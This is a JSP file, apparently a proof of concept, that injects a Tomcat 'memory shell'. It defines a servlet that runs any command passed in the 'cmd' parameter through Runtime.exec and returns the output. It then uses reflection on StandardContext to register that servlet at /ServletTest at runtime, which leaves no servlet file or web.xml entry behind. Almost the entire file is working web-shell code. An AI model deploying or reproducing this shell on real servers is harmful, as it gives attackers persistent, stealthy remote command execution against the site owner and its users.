<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="com.mechoy.servlet.PocServlet" %><%--
  Created by IntelliJ IDEA.
  User: mechoy
  Date: 2023/5/11
  Time: 23:20
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>JSP注入Servlet内存马</title>
</head>
<body>
<%!
    public class ServletTest extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest request, HttpServletResponse response) {
            response.setContentType("text/plain");
            response.setCharacterEncoding("UTF-8");
            String cmd = request.getParameter("cmd");

            try {
                // 执行系统命令
                Process process = Runtime.getRuntime().exec(cmd);

                // 读取命令输出
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                // 等待命令执行完成
                int exitCode = process.waitFor();
                output.append("\n命令执行完成，退出码为 " + exitCode);

                // 输出命令输出结果到客户端
                response.getWriter().print(output.toString());
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        @Override
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
            doGet(request, response);
        }
    }
%>

<%
    // 动态注册Servlet
    // 1.获取standardContext
    ServletContext servletContext = request.getServletContext();
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 获取wrapper
    Wrapper wrapper = standardContext.createWrapper();

    // 设置servlet
    wrapper.setName("ServletTest");     // Servlet-name
    wrapper.setServletClass(ServletTest.class.getName());   // Servlet-Class

    // 因为自定义的Servlet并没有实例化，所以此处需要实例化自定义的Servlet并与该Wrapper关联
    wrapper.setServlet(new ServletTest());

    // 将wrapper放置standardContext
    standardContext.addChild(wrapper);

    // 设置请求路径，对应servlet名称   Servlet-mapping
    standardContext.addServletMappingDecoded("/ServletTest","ServletTest");

    System.out.println(servletContext);


%>
</body>
</html>
